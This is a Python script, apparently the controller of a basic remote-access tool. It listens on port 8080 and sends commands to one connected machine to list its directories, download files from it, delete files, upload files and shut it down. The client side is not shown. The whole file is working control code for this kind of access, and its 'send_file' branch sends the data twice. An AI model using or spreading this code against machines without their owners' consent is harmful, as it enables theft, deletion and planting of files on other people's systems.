#Made by qpzux

import os
import socket

s = socket.socket()
host = socket.gethostname()
port = 8080
s.bind((host, port))

print ("")
print ("Server is currently running @ ", host)
print ("")
print ("Waiting for connection...")
s.listen(1)
conn, addr = s.accept()
print ("")
print (addr, "Has connected to the server successfully.")

while 1:
    command = input(str("Command to send: "))
    if command == "view_cwd":
        conn.send(command.encode())
        print("")
        print("Sending and executing command...")
        print("")
        print("Execution complete.")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print ("Command output: ", files)
        print ("")

    elif command == "custom_dir":
        conn.send(command.encode())
        user_input = input(str("Custom dir: "))
        conn.send(user_input.encode())
        print ("")
        print ("Command has been sent...")
        print ("")
        files = conn.recv(5000)
        files = files.decode()
        print ("Custom dir result: ", files)
        print ("")

    elif command == "download_file":
        conn.send(command.encode())
        filepath = input(str("Please enter the file path including the name: "))
        print ("")
        conn.send(filepath.encode())
        file = conn.recv(10000)
        filename = input(str("Please enter a name for the file you want to save including the extension: "))
        print("")
        new_file = open(filename, "wb")
        new_file.write(file)
        new_file.close()
        print (filename, "Has finished downloading.")
        print ("")

    elif command == "remove_file":
        conn.send(command.encode())
        fileanddir = input(str("Please state the file path: "))
        conn.send(fileanddir.encode())
        print ("")
        print ("Command sent.")
        print ("")

    elif command == "send_file":
        conn.send(command.encode())
        file = input(str("Please enter the file name and directory: "))
        filename = input(str("Please enter the name that you would like the file to be sent as including the extension: "))
        print ("")
        data = open(file, "rb")
        filedata = data.read(7000)
        conn.send(filename.encode())
        conn.send(filedata)
        print ("File sent.")
        print ("")
        conn.send(filedata)

    elif command == "shutdown":
        conn.send(command.encode())
        print ("Command sent.")
        print ("")

    else:
        print ("No command such as: ", command)